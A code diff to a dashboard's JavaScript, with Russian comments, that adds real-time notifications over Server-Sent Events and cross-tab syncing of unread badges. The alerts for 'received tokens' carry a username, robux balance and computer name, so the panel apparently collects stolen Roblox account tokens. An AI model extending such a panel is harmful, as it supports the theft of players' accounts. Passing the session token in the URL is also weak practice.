@@ -416,11 +416,80 @@ async function checkNewTokensBackground() {
   } catch (e) {}
 }
 
-// Фоновый таймер проверки новых токенов каждые 15 сек
+// Фоновый таймер проверки новых токенов каждые 15 сек (резервный опрос)
 if (getToken()) {
   setInterval(checkNewTokensBackground, 15000);
   setTimeout(checkNewTokensBackground, 2000);
 }
+
+// ── Реалтайм SSE подключение для мгновенных уведомлений ──────────────────────
+let realtimeEventSource = null;
+
+function initRealtimeEvents() {
+  const token = getToken();
+  if (!token || realtimeEventSource) return;
+
+  try {
+    const sseUrl = `${API_BASE}/events?token=${encodeURIComponent(token)}`;
+    realtimeEventSource = new EventSource(sseUrl);
+
+    realtimeEventSource.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        if (data.event === 'token_received') {
+          showTokenNotification({
+            username: data.token?.username,
+            userId: data.token?.userId,
+            robux: data.token?.robux,
+            computer: data.token?.computer
+          });
+        } else if (data.event === 'chat_message') {
+          checkUnreadChatBackground();
+        }
+      } catch (err) {}
+    };
+
+    realtimeEventSource.onerror = () => {
+      if (realtimeEventSource) {
+        realtimeEventSource.close();
+        realtimeEventSource = null;
+      }
+      setTimeout(initRealtimeEvents, 10000);
+    };
+  } catch (e) {}
+}
+
+if (getToken()) {
+  initRealtimeEvents();
+}
+
+// ── Межвкладочная синхронизация (Storage Event) ────────────────────────────────
+window.addEventListener('storage', (e) => {
+  if (e.key === getUserNotifKey() || e.key === getUserNotifTimeKey()) {
+    const notifBadge = document.getElementById('sidebarNotifBadge');
+    if (notifBadge) {
+      const unread = getUnreadNotificationsCount();
+      if (unread > 0) {
+        notifBadge.textContent = unread > 99 ? '99+' : unread;
+        notifBadge.style.display = 'inline-flex';
+      } else {
+        notifBadge.style.display = 'none';
+      }
+    }
+  }
+  if (e.key === 'ft_cached_chat_messages' || e.key === getUserChatTimeKey()) {
+    const chatBadge = document.getElementById('sidebarChatBadge');
+    if (chatBadge) {
+      const unread = getUnreadChatCount();
+      if (unread > 0) {
+        chatBadge.textContent = unread > 99 ? '99+' : unread;
+        chatBadge.style.display = 'inline-flex';
+      } else {
+        chatBadge.style.display = 'none';
+      }
+    }
+  }
+});
 
 function escapeHtml(s) {
   return String(s == null ? '' : s)
